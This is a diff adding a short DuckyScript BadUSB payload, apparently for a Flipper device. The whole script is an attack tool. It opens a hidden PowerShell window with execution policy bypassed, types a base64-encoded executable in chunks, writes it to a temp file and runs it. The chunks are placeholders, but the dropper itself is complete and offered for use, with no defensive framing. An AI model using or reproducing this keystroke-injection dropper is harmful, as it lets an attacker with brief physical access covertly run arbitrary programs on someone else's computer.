@@ -1,0 +1,25 @@
+REM Chunk file from Flipper to target via HID, then execute
+REM Encode your payload: base64 -w 200 payload.exe > chunks.txt
+REM Replace each CHUNK_n below with a line from chunks.txt
+
+DELAY 2000
+GUI r
+DELAY 800
+STRING powershell -ep bypass -w hidden
+ENTER
+DELAY 1000
+
+REM Build payload string from typed chunks
+STRING $d = ""
+ENTER
+STRING $d += "CHUNK_1"
+ENTER
+STRING $d += "CHUNK_2"
+ENTER
+STRING $d += "CHUNK_3"
+ENTER
+REM Add more $d += "CHUNK_n" lines as needed
+
+REM Decode base64, write to temp file, execute
+STRING $b = [Convert]::FromBase64String($d); $f = "$env:TEMP\r.exe"; [IO.File]::WriteAllBytes($f, $b); Start-Process $f
+ENTER
